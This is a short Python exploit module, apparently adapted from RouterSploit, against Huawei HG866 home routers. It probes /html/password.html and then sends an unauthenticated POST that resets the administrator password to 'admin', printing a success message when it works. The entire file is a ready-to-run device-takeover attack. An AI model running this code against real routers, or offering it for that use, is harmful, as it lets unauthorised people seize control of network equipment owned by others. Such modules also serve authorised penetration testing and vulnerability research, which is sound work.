# title: Huawei HG866 Password Change
# rsf exploit module
# description: Module exploits password change vulnerability in Huawei HG866 devices.

import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.password = 'admin'

    def http_request(self, method, path, **kwargs):
        url = f"http://{self.target}:{self.port}{path}"
        try:
            if method == "GET":
                return requests.get(url, **kwargs)
            elif method == "POST":
                return requests.post(url, **kwargs)
        except:
            return None

    def run(self):
        if self.check():
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            data = {'psw': self.password,
                    'reenterpsw': self.password,
                    'save': 'Apply'}

            print("[*] Sending password change request")
            response = self.http_request(
                method="POST",
                path="/html/password.html",
                headers=headers,
                data=data
            )

            if response and response.status_code == 200:
                print(f"[+] Administrator's password has been changed to {self.password}")
            else:
                print("[-] Exploit failed - could not change password")
        else:
            print("[-] Exploit failed - target seems to be not vulnerable")

    def check(self):
        response = self.http_request(method="GET", path="/html/password.html")
        if response is None:
            return False

        if response.status_code == 200 and "psw" in response.text and "reenterpsw" in response.text:
            return True
        return False
